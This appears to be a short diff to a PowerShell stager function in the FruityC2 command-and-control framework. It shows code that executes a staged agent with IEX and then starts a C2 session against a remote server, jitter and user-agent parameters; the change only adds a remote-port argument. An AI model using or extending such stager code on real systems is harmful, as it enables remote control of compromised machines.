@@ -130,7 +130,7 @@ function Invoke-Stager {
         Write-Host $agent
 
         IEX $($agent)
-        Invoke-FruityC2 -path_get $path_get -path_post $path_post -jitter $jitter -stime $stime -UA $UA -stager $false -r_server $r_server -target $TARGET -post_id $post_id -session_id $session_id
+        Invoke-FruityC2 -path_get $path_get -path_post $path_post -jitter $jitter -stime $stime -UA $UA -stager $false -r_server $r_server -r_port $r_port -target $TARGET -post_id $post_id -session_id $session_id
 
     }
 
